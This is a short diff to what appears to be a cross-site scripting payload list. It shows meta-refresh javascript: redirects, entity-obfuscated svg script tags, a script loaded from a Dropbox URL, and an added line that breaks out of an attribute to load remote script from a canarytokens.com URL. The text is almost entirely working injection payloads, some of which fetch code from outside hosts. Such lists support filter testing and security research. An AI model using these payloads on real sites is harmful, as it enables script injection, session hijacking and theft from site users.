@@ -27,7 +27,7 @@
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
 
 <svg><script xlink:href=data&colon;,window.open('https://blog.zsec.uk/')></script
-
+"><script src="http://canarytokens.com/articles/static/z3vly69a1lhdgqglhnpi90bc3/post.jsp"> </SCRipt>
 <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
 
 <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
